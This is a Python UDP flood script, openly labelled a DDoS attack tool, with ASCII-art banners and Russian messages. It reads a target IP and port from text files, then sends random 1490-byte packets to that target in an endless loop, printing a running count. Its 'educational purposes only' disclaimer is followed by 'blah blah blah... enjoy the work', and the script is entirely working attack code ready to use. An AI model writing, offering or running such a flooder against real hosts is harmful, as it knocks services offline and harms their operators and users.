import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
from colorama import init, Fore, Back, Style
init()
def console_picture():
    print(Style.BRIGHT + Fore.YELLOW)
    print("                **    **  ********  **        **            **      ")
    print("               **    **  ********  **        **         **     **   ")
    print("              ********  **        **        **         **      **  ")
    print("             ********  ********  **        **         **      **  ")
    print("            **    **  **        **        **         **      **  ")
    print("           **    **  ********  ********  ********    **    **   ")
    print("          **    **  ********  ********  ********       **      ")
console_picture()
print("Author Anonimus 'LegindarySiDay'")
print("данное занятие незаконно на территории российской федерации")
print("всю ответственность за проделанное вы несете сами")
print("программа созданна лишь в ознакомительных целях")
print("бла бла бла... наслаждайтесь работой")
print("")
print("")
print("")
print("")
print("")
print("")
print("")
time.sleep(8)
print(Style.BRIGHT + Fore.RED)
print ("                      :::!~!!!!!:. ")
print ("                   .xUHWH!! !!?M88WHX:. ")
print ("                 .X*#M@$!!  !X!M$$$$$$WWx:. ")
print ("                :!!!!!!?H! :!$!$$$$$$$$$$8X: ")
print ("               !!~  ~:~!! :~!$!#$$$$$$$$$$8X: ")
print ("              :!~::!H!<   ~.U$X!?R$$$$$$$$MM! ")
print ("              ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM! ")
print ("                !:~~~ .:!M*T#$$$$WX??#MRRMMM! ")
print ("                ~?WuxiW*`   `*#$$$$8!!!!??!!! ")
print ("              :X- M$$$$       `*T#$T~!8$WUXU~ ")
print ("             :%`  ~#$$$m:        ~!~ ?$$$$$$ ")
print ("           :!`.-   ~T$$$$8xx.  .xWW- ~**##* ")
print (" .....   -~~:<` !    ~?T#$$@@W@*?$$      /` ")
print (" W$@@M!!! .!~~ !!     .:XUW$W!~ `*~:    : ")
print (" **~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!` ")
print (" :::~:!!`:X~ .: ?H.!u *$$$B$$$!W:U!T$$M~ ")
print (" .~~   :X@!.-~   ?@WTWo(**$$$W$TH$! ` ")
print (" Wi.~!X$?!-~    : ?$$$B$Wu(***$RM! ")
print (" $R@i.~~ !     :   ~$$$$$B$$en:`` ")
print (" ?MXT@Wx.~    :     ~##**$$$$M~ ")
print("")
print("")
print("")
print("введите что угодно, чтобы начать атаку")
a = input()
print("Run DDOS Attack")
print(Style.BRIGHT + Fore.GREEN)
print("")
print("")
print("")
ip1 = open('ip.txt')
port1 = open('port.txt')
ip = ip1.read()
port = int(port1.read())
sent = 0

while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     if sent % 10000 == 0:
       print("мы уже послали",sent, "пакетов на" ,ip,port)
